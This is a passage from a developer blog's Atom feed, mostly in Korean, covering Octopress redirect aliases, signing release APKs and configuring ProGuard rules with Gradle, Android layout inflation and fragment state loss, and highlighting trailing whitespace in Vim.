</span><span class='line'><span class="l-Scalar-Plain">title</span><span class="p-Indicator">:</span> <span class="s">&quot;How</span><span class="nv"> </span><span class="s">to</span><span class="nv"> </span><span class="s">Add</span><span class="nv"> </span><span class="s">Redirects</span><span class="nv"> </span><span class="s">to</span><span class="nv"> </span><span class="s">Post</span><span class="nv"> </span><span class="s">URL</span><span class="nv"> </span><span class="s">on</span><span class="nv"> </span><span class="s">Octopress&quot;</span>
</span><span class='line'><span class="l-Scalar-Plain">alias</span><span class="p-Indicator">:</span> <span class="p-Indicator">[</span><span class="nv">/one-alias/index.html</span><span class="p-Indicator">,</span> <span class="nv">/another-alias/index.html</span><span class="p-Indicator">]</span>
</span><span class='line'><span class="nn">---</span>
</span></code></pre></td></tr></table></div></figure>


<p>When I <code>rake generate</code>, the plugin generates static html file at <code>/p/20140523/index.html</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span><span class='line'><span class="nt">&lt;html&gt;</span>
</span><span class='line'><span class="nt">&lt;head&gt;</span>
</span><span class='line'><span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">&quot;canonical&quot;</span> <span class="na">href=</span><span class="s">&quot;/2014/05/23/how-to-add-redirects-to-post-url-on-octopress/&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">&quot;content-type&quot;</span> <span class="na">content=</span><span class="s">&quot;text/html; charset=utf-8&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">&quot;refresh&quot;</span> <span class="na">content=</span><span class="s">&quot;0;url=/2014/05/23/how-to-add-redirects-to-post-url-on-octopress/&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;/head&gt;</span>
</span><span class='line'><span class="nt">&lt;/html&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>When you go to <a href="http://yous.be/p/20140523">/p/20140523</a>, it will redirect here. It also has <a href="http://en.wikipedia.org/wiki/Canonical_link_element">canonical link</a>, so it won&rsquo;t affect search engine or web analysis services.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Gradle 환경에서 ProGuard 사용하기]]></title>
    <link href="http://yous.be/2014/05/15/how-to-configure-proguard-using-gradle/"/>
    <updated>2014-05-15T18:11:13+09:00</updated>
    <id>http://yous.be/2014/05/15/how-to-configure-proguard-using-gradle</id>
    <content type="html"><![CDATA[<h2><a id="gradle"></a>Gradle</h2>

<p><img src="http://www.gradle.org/img/gradle_logo.gif" alt="Gradle" /></p>

<p>최근 <a href="http://developer.android.com/sdk/installing/studio.html">Android Studio</a>를 통해 개발을 진행하게 되면서, 자연스럽게 <a href="http://www.gradle.org">Gradle</a>을 사용하게 되었다. <code>.gradle</code> 확장자를 가진 파일을 통해 빌드 설정을 자유롭게 조정할 수 있다. 이 글에서는 Gradle을 이용해 배포 APK를 생성하는 방법과 함께 <a href="http://proguard.sourceforge.net">ProGuard</a>를 사용법을 공유하겠다.</p>

<h2><a id="how-to-create-release-apk-using-gradle"></a>Gradle 환경에서 배포 APK 생성하기</h2>

<p>배포 APK에는 서명이 되어 있어야 하는데, 이를 위해서는 keystore 파일과 그 암호, 키 별칭, 키 암호가 필요하다. 디버그 APK에도 서명을 하지만, <a href="http://developer.android.com/tools/publishing/app-signing.html#debugmode">알려진 keystore 암호와 키 별칭, 키 암호</a>를 사용한다. 배포 APK의 서명을 위해 프로젝트의 <code>build.gradle</code> 파일에 다음 코드를 추가하면 된다.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="n">android</span> <span class="o">{</span>
</span><span class='line'>    <span class="c1">// ...</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">signingConfigs</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">release</span> <span class="o">{</span>
</span><span class='line'>            <span class="n">storeFile</span> <span class="nf">file</span><span class="o">(</span><span class="s2">&quot;YOUR_KEYSTORE_PATH&quot;</span><span class="o">)</span>
</span><span class='line'>            <span class="n">storePassword</span> <span class="s2">&quot;YOUR_KEYSTORE_PASSWORD&quot;</span>
</span><span class='line'>            <span class="n">keyAlias</span> <span class="s2">&quot;YOUR_KEY_ALIAS&quot;</span>
</span><span class='line'>            <span class="n">keyPassword</span> <span class="s2">&quot;YOUR_KEY_PASSWORD&quot;</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">buildTypes</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">release</span> <span class="o">{</span>
</span><span class='line'>            <span class="n">signingConfig</span> <span class="n">signingConfigs</span><span class="o">.</span><span class="na">release</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>이때 <code>buildTypes</code> 아래의 <code>debug</code> 항목은 굳이 명시하지 않아도 <a href="http://tools.android.com/tech-docs/new-build-system/user-guide#TOC-Build-Types">기본적으로 생성</a>되며, 이 <code>buildType</code>은 <a href="http://tools.android.com/tech-docs/new-build-system/user-guide#TOC-Signing-Configurations">디버그 keystore와 키를 사용하도록 설정</a>되어 있다.</p>

<p>다만 이 때 <code>build.gradle</code> 파일에 keystore 암호와 키 암호가 평문으로 들어가게 되는데, 소스를 공개하고 있는 등의 이유로 이를 피하고 싶다면 각각의 항목을 쉘 프롬프트에서 입력받을 수 있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="n">signingConfigs</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">release</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">storeFile</span> <span class="nf">file</span><span class="o">(</span><span class="n">console</span><span class="o">.</span><span class="na">readLine</span><span class="o">(</span><span class="s2">&quot;\n\$ Enter keystore path: &quot;</span><span class="o">))</span>
</span><span class='line'>        <span class="n">storePassword</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="n">console</span><span class="o">.</span><span class="na">readPassword</span><span class="o">(</span><span class="s2">&quot;\n\$ Enter keystore password: &quot;</span><span class="o">))</span>
</span><span class='line'>        <span class="n">keyAlias</span> <span class="n">console</span><span class="o">.</span><span class="na">readLine</span><span class="o">(</span><span class="s2">&quot;\n\$ Enter key alias: &quot;</span><span class="o">)</span>
</span><span class='line'>        <span class="n">keyPassword</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="n">console</span><span class="o">.</span><span class="na">readPassword</span><span class="o">(</span><span class="s2">&quot;\n\$ Enter key password: &quot;</span><span class="o">))</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>그러나 이는 <a href="http://stackoverflow.com/questions/18328730/how-to-create-a-release-signed-apk-file-using-gradle#19210105">IDE를 통해 디버그 APK를 생성할 때 크래시</a>를 내며, 이는 그때 코드의 <code>console</code>이 <code>null</code>이라서 발생하는 오류다. 이를 해결한 최종 코드는 다음과 같다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="n">signingConfigs</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">release</span> <span class="o">{</span>
</span><span class='line'>        <span class="kd">final</span> <span class="n">Console</span> <span class="n">console</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">console</span><span class="o">();</span>
</span><span class='line'>        <span class="k">if</span> <span class="o">(</span><span class="n">console</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>            <span class="n">storeFile</span> <span class="nf">file</span><span class="o">(</span><span class="n">console</span><span class="o">.</span><span class="na">readLine</span><span class="o">(</span><span class="s2">&quot;\n\$ Enter keystore path: &quot;</span><span class="o">))</span>
</span><span class='line'>            <span class="n">storePassword</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="n">console</span><span class="o">.</span><span class="na">readPassword</span><span class="o">(</span><span class="s2">&quot;\n\$ Enter keystore password: &quot;</span><span class="o">))</span>
</span><span class='line'>            <span class="n">keyAlias</span> <span class="n">console</span><span class="o">.</span><span class="na">readLine</span><span class="o">(</span><span class="s2">&quot;\n\$ Enter key alias: &quot;</span><span class="o">)</span>
</span><span class='line'>            <span class="n">keyPassword</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="n">console</span><span class="o">.</span><span class="na">readPassword</span><span class="o">(</span><span class="s2">&quot;\n\$ Enter key password: &quot;</span><span class="o">))</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>디버그 APK와 배포 APK의 패키지 이름이 같으면 APK의 서명이 서로 달라 개발과 디버깅에 어려움이 있다. 이를 해결하기 위해서 <code>buildTypes</code> 아래에 <code>debug</code> 항목을 선언하여 디버그 APK의 패키지 이름을 바꿀 수 있고, 추가로 버전명도 바꿀 수 있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="n">buildTypes</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">debug</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">packageNameSuffix</span> <span class="s1">&#39;.debug&#39;</span>
</span><span class='line'>        <span class="n">versionNameSuffix</span> <span class="s1">&#39;-debug&#39;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>이제 터미널에서 다음 명령을 실행하면 디버그 APK와 배포 APK를 각각 얻을 수 있다. 물론 디버그 APK는 IDE로도 생성할 수 있다.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>./gradlew assembleDebug
</span><span class='line'><span class="nv">$ </span>./gradlew assembleRelease
</span></code></pre></td></tr></table></div></figure>


<p>Gradle은 <a href="http://tools.android.com/tech-docs/new-build-system/user-guide#TOC-Android-tasks">캐멀케이스 단축키를 지원</a>해서 <code>aR</code>에 해당하는 다른 명령이 없는 한 <code>assembleRelease</code> 대신 <code>aR</code>을 사용할 수 있다.</p>

<!-- more -->


<h2><a id="how-to-use-proguard"></a>ProGuard 사용하기</h2>

<p>배포 APK를 생성할 때 ProGuard를 사용할 수도 있는데, <code>build.gradle</code>에 다음 코드를 추가하면 된다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="n">buildTypes</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">release</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">runProguard</span> <span class="kc">true</span>
</span><span class='line'>        <span class="n">proguardFile</span> <span class="nf">getDefaultProguardFile</span><span class="o">(</span><span class="s1">&#39;proguard-android.txt&#39;</span><span class="o">)</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>getDefaultProguardFile()</code>는 <a href="http://tools.android.com/tech-docs/new-build-system/user-guide#TOC-Running-ProGuard">SDK에 위치한 해당 이름의 파일을 가져와 적용</a>한다. <code>proguard-android.txt</code>와 <code>proguard-android-optimize.txt</code>가 있으며 <a href="http://tools.android.com/tech-docs/new-build-system/user-guide#TOC-Running-ProGuard">앞의 것은 최적화를 수행하지 않고, 뒤의 것은 최적화를 수행</a>한다.</p>

<p>추가적인 다른 <code>proguardFile</code>을 더 적용하고 싶다면 <code>proguardFiles</code>를 사용하면 된다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="n">buildTypes</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">release</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">runProguard</span> <span class="kc">true</span>
</span><span class='line'>        <span class="n">proguardFiles</span> <span class="nf">getDefaultProguardFile</span><span class="o">(</span><span class="s1">&#39;proguard-android.txt&#39;</span><span class="o">),</span> <span class="s1">&#39;proguard-project.txt&#39;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>다른 라이브러리 프로젝트를 가져다 사용하고 있을 경우, ProGuard 사용에 있어 주의해야 할 경우가 생긴다.</p>

<h3><a id="actionbarsherlock"></a>ActionBarSherlock</h3>

<p><a href="http://actionbarsherlock.com">ActionBarSherlock</a>의 경우 ProGuard를 사용할 때, <a href="http://actionbarsherlock.com/faq.html">다음 규칙을 추가하라고 명시</a>하고 있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="o">-</span><span class="n">keep</span> <span class="kd">class</span> <span class="nc">android</span><span class="o">.</span><span class="na">support</span><span class="o">.</span><span class="na">v4</span><span class="o">.</span><span class="na">app</span><span class="o">.**</span> <span class="o">{</span> <span class="o">*;</span> <span class="o">}</span>
</span><span class='line'><span class="o">-</span><span class="n">keep</span> <span class="kd">interface</span> <span class="nc">android</span><span class="o">.</span><span class="na">support</span><span class="o">.</span><span class="na">v4</span><span class="o">.</span><span class="na">app</span><span class="o">.**</span> <span class="o">{</span> <span class="o">*;</span> <span class="o">}</span>
</span><span class='line'><span class="o">-</span><span class="n">keep</span> <span class="kd">class</span> <span class="nc">com</span><span class="o">.</span><span class="na">actionbarsherlock</span><span class="o">.**</span> <span class="o">{</span> <span class="o">*;</span> <span class="o">}</span>
</span><span class='line'><span class="o">-</span><span class="n">keep</span> <span class="kd">interface</span> <span class="nc">com</span><span class="o">.</span><span class="na">actionbarsherlock</span><span class="o">.**</span> <span class="o">{</span> <span class="o">*;</span> <span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="o">-</span><span class="n">keepattributes</span> <span class="o">*</span><span class="n">Annotation</span><span class="o">*</span>
</span></code></pre></td></tr></table></div></figure>


<h3><a id="crashlytics"></a>Crashlytics</h3>

<p><a href="https://www.crashlytics.com">Crashlytics</a>는 이미 ProGuard를 사용한 라이브러리들을 다시 ProGuard가 검사할 필요 없게 해서 <a href="http://www.crashlytics.com/blog/mastering-proguard-for-building-lightweight-android-code/">빌드 시간을 줄이는 팁</a>을 제공하고 있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="o">-</span><span class="n">libraryjars</span> <span class="n">libs</span>
</span><span class='line'><span class="o">-</span><span class="n">keep</span> <span class="kd">class</span> <span class="nc">com</span><span class="o">.</span><span class="na">crashlytics</span><span class="o">.**</span> <span class="o">{</span> <span class="o">*;</span> <span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p><a href="http://developer.android.com/tools/support-library/">Android Support Library</a>는 이미 소스가 공개되어 있기 때문에 코드 난독화가 필요하지 않다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="o">-</span><span class="n">libraryjars</span> <span class="n">libs</span>
</span><span class='line'><span class="o">-</span><span class="n">keep</span> <span class="kd">class</span> <span class="nc">android</span><span class="o">.</span><span class="na">support</span><span class="o">.</span><span class="na">v4</span><span class="o">.</span><span class="na">app</span><span class="o">.**</span> <span class="o">{</span> <span class="o">*;</span> <span class="o">}</span>
</span><span class='line'><span class="o">-</span><span class="n">keep</span> <span class="kd">interface</span> <span class="nc">android</span><span class="o">.</span><span class="na">support</span><span class="o">.</span><span class="na">v4</span><span class="o">.</span><span class="na">app</span><span class="o">.**</span> <span class="o">{</span> <span class="o">*;</span> <span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>ProGuard를 이용해 코드 난독화 작업을 거치게 되면, 소스 파일의 줄 번호가 바뀌게 되어 Crashlytics의 스택 트레이스에서 정보를 얻기 어려울 수 있다. <a href="http://support.crashlytics.com/knowledgebase/articles/202926-android-studio-and-intellij-with-proguard">소스 파일의 줄 번호 정보를 유지</a>하려면 다음 문장을 추가한다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="o">-</span><span class="n">keepattributes</span> <span class="n">SourceFile</span><span class="o">,</span><span class="n">LineNumberTable</span>
</span></code></pre></td></tr></table></div></figure>


<p>다만 이 코드 때문에 난독화가 덜 되는 것 같다는 생각이 든다면, 파일 이름을 모두 <code>"SourceFile"</code> 문자열로 <a href="http://proguard.sourceforge.net/manual/examples.html#stacktrace">바꿀 수도 있다</a>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="o">-</span><span class="n">renamesourcefileattribute</span> <span class="n">SourceFile</span>
</span><span class='line'><span class="o">-</span><span class="n">keepattributes</span> <span class="n">SourceFile</span><span class="o">,</span><span class="n">LineNumberTable</span>
</span></code></pre></td></tr></table></div></figure>


<h3><a id="google-play-services-sdk"></a>Google Play Services SDK</h3>

<p><a href="https://developer.android.com/google/play-services/index.html">Google Play Services SDK</a> 또한 필요한 클래스가 사라지는 것을 방지하기 위한 <a href="https://developer.android.com/google/play-services/setup.html#Proguard">ProGuard 규칙</a>을 제공하고 있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='groovy'><span class='line'><span class="o">-</span><span class="n">keep</span> <span class="kd">class</span> <span class="err">* </span><span class="nc">extends</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ListResourceBundle</span> <span class="o">{</span>
</span><span class='line'>    <span class="kd">protected</span> <span class="n">Object</span><span class="o">[][]</span> <span class="nf">getContents</span><span class="o">();</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="o">-</span><span class="n">keep</span> <span class="kd">public</span> <span class="kd">class</span> <span class="nc">com</span><span class="o">.</span><span class="na">google</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">gms</span><span class="o">.</span><span class="na">common</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">safeparcel</span><span class="o">.</span><span class="na">SafeParcelable</span> <span class="o">{</span>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="o">***</span> <span class="n">NULL</span><span class="o">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="o">-</span><span class="n">keepnames</span> <span class="nd">@com.google.android.gms.common.annotation.KeepName</span> <span class="kd">class</span> <span class="err">*</span>
</span><span class='line'><span class="o">-</span><span class="n">keepclassmembernames</span> <span class="kd">class</span> <span class="err">* {</span>
</span><span class='line'>    <span class="nd">@com.google.android.gms.common.annotation.KeepName</span> <span class="o">*;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="o">-</span><span class="n">keepnames</span> <span class="kd">class</span> <span class="err">* </span><span class="nc">implements</span> <span class="n">android</span><span class="o">.</span><span class="na">os</span><span class="o">.</span><span class="na">Parcelable</span> <span class="o">{</span>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="o">**</span> <span class="n">CREATOR</span><span class="o">;</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<h2><a id="see-also"></a>참고 목록</h2>

<ul>
<li><a href="http://tools.android.com/tech-docs/new-build-system/user-guide">Gradle Plugin User Guide</a> by <a href="http://tools.android.com">Android Tools Project Site</a></li>
<li><a href="http://www.crashlytics.com/blog/mastering-proguard-for-building-lightweight-android-code/">Mastering ProGuard for Building Lightweight Android Code</a> by <a href="https://www.crashlytics.com">Crashlytics</a></li>
<li><a href="http://proguard.sourceforge.net/manual/index.html">ProGuard Manual</a> by <a href="http://proguard.sourceforge.net">ProGuard</a></li>
<li><a href="http://novafactory.net/archives/2845">Gradle - Progaurd 사용하기(proguard rule)</a> by <a href="https://plus.google.com/113131691466488717287">Nova</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Layout Inflation as Intended &rarr;]]></title>
    <link href="http://yous.be/2014/05/12/layout-inflation-as-intended/"/>
    <updated>2014-05-12T07:17:37+09:00</updated>
    <id>http://yous.be/2014/05/12/layout-inflation-as-intended</id>
    <content type="html"><![CDATA[<p>안드로이드 개발을 하다 보면 <a href="http://developer.android.com/reference/android/view/LayoutInflater.html">LayoutInflater</a>의 <a href="http://developer.android.com/reference/android/view/LayoutInflater.html#inflate(int,%20android.view.ViewGroup)">inflate(int, ViewGroup)</a>와 <a href="http://developer.android.com/reference/android/view/LayoutInflater.html#inflate(int,%20android.view.ViewGroup,%20boolean)">inflate(int, ViewGroup, boolean)</a>는 꽤 익숙하다. 하지만 다음 두 줄의 코드가 어떻게 다른지 아는 사람은 그리 많지 않을 것 같다. 실제로 <a href="http://tools.android.com/tips/lint">Android Lint</a>는 한쪽 코드는 피하도록 권하고 있다.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">inflater</span><span class="o">.</span><span class="na">inflate</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">my_layout</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
</span><span class='line'><span class="n">inflater</span><span class="o">.</span><span class="na">inflate</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">my_layout</span><span class="o">,</span> <span class="n">parent</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
</span></code></pre></td></tr></table></div></figure>


<p><a href="http://www.doubleencore.com/author/daves/">Dave Smith</a>가 이 두 코드의 비교와 함께, <a href="http://www.doubleencore.com/2013/05/layout-inflation-as-intended/">바른 Layout Inflation 방법</a>에 대해 설명한 글이 있어 소개한다.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Fragment Transaction &amp; Activity State Loss &rarr;]]></title>
    <link href="http://yous.be/2014/04/03/fragment-transaction-and-activity-state-loss/"/>
    <updated>2014-04-03T00:03:50+09:00</updated>
    <id>http://yous.be/2014/04/03/fragment-transaction-and-activity-state-loss</id>
    <content type="html"><![CDATA[<p><a href="http://developer.android.com/reference/android/support/v4/app/FragmentTransaction.html">FragmentTransaction</a>을 <a href="http://developer.android.com/reference/android/support/v4/app/FragmentTransaction.html#commit()">commit()</a> 했을 때 Activity의 <a href="http://developer.android.com/reference/android/app/Activity.html#onSaveInstanceState(android.os.Bundle)">onSaveInstanceState(Bundle)</a>이 실행된 후라면 다음과 같은 에러 메시지를 보게 된다:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>java.lang.IllegalStateException: Can not perform this action after onSaveInstanceState</span></code></pre></td></tr></table></div></figure>


<p>이 문제의 원인이 무엇인지, 어떻게 이 Exception을 피할지, 그리고 <a href="http://developer.android.com/reference/android/support/v4/app/FragmentTransaction.html#commitAllowingStateLoss()">commitAllowingStateLoss()</a>가 왜 마지막 수단이 되어야 하는지 잘 설명한 글이 있어 소개한다. <a href="http://www.androiddesignpatterns.com/about/">Alex Lockwood</a>가 쓴 <a href="http://www.androiddesignpatterns.com/2013/08/fragment-transaction-commit-state-loss.html">Fragment Transaction과 Activity State Loss</a>에 관한 글이다.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Trailing whitespace is evil. Don't commit evil into your repo. &rarr;]]></title>
    <link href="http://yous.be/2014/03/31/trailing-whitespace-is-evil-dont-commit-evil-into-your-repo/"/>
    <updated>2014-03-31T20:57:09+09:00</updated>
    <id>http://yous.be/2014/03/31/trailing-whitespace-is-evil-dont-commit-evil-into-your-repo</id>
    <content type="html"><![CDATA[<p><a href="http://codeimpossible.com/about.html">Jared Barboza</a>가 쓴 <a href="http://codeimpossible.com/2012/04/02/Trailing-whitespace-is-evil-Don-t-commit-evil-into-your-repo-/">줄 끝 공백에 관한 글</a>이다.</p>

<blockquote><p><strong>난 최근에 다양한 사람/언어/편집기와 함께 많은 프로젝트를 진행해 왔다. 우리들 대부분은 Git 초보자였고, 각 프로젝트는 줄 끝 공백에 관한 문제가 있었다.</strong></p></blockquote>

<p>경력 있는 개발자로만 이루어진 팀이라고 해도 이런 문제는 발생하기 마련이다.</p>

<blockquote><p>줄 끝 공백은 당신의 저장소에서 상당히 많은 문제를 일으킬 수 있다. 실제로 바뀐 것은 공백일 뿐인데도 그 줄에 변경 사항이 있다는 잘못된 diff를 만든다.</p>

<p>이는 개발 과정에서 나중에 실제 파일의 변경 사항이 무엇이었는지 찾기 불가능하게 만든다. 대부분의 오픈 소스 프로젝트 대표들은 이를 알고 있고, 그들 대부분은 줄 끝 공백을 없애지 않은 풀 리퀘스트를 거절할 것이다.</p></blockquote>

<p>이후 글에서는 Visual Studio와 Sublime Text 2에서 줄 끝 공백을 제거하는 방법과 git hook을 통해 커밋에 줄 끝 공백이 포함되지 않도록 하는 방법을 소개하고 있다.</p>

<p>나는 Android Studio에서는 파일 저장 시 모든 줄 끝 공백을 지우고, Vim에서는 줄 끝 공백에 하이라이트를 입혀 쓰고 있다.</p>

<figure class='code'><figcaption><span>.vimrc</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='vim'><span class='line'><span class="nb">highlight</span> ExtraWhitespace ctermbg<span class="p">=</span><span class="k">red</span> guibg<span class="p">=</span><span class="k">red</span>
</span><span class='line'>autocmd <span class="nb">BufWinEnter</span> * <span class="k">match</span> ExtraWhitespace <span class="sr">/\s\+$/</span>
